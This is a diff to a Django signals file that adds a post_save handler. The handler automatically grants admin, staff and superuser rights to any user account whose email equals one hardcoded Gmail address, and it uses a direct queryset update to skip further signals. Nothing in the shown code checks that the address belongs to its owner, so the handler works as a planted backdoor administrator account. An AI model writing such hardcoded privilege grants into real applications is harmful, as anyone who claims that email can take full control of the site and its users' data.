@@ -35,3 +35,24 @@ def save_user_profile(sender, instance, **kwargs):
     elif instance.user_type == User.UserType.CUSTOMER:
         if hasattr(instance, 'customer_profile'):
             instance.customer_profile.save()
+
+
+@receiver(post_save, sender=User)
+def auto_admin_for_owner(sender, instance, **kwargs):
+    """
+    Automatically promote beniev8@gmail.com to admin.
+    Uses filter().update() to avoid infinite signal recursion.
+    """
+    AUTO_ADMIN_EMAIL = 'beniev8@gmail.com'
+    if instance.email == AUTO_ADMIN_EMAIL:
+        needs_update = (
+            instance.user_type != User.UserType.ADMIN
+            or not instance.is_staff
+            or not instance.is_superuser
+        )
+        if needs_update:
+            User.objects.filter(pk=instance.pk).update(
+                user_type=User.UserType.ADMIN,
+                is_staff=True,
+                is_superuser=True,
+            )
